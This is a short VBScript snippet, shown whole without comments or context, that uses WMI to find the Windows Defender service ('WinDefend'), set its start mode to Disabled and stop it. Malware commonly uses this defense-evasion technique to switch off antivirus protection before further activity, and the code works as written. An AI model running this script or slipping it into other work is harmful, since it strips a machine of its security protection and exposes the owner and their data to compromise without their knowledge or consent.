Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("Select * from Win32_Service where Name='WinDefend'")
For Each objItem in colItems
    errReturn = objItem.ChangeStartMode("Disabled")
    errReturn = objItem.StopService()
Next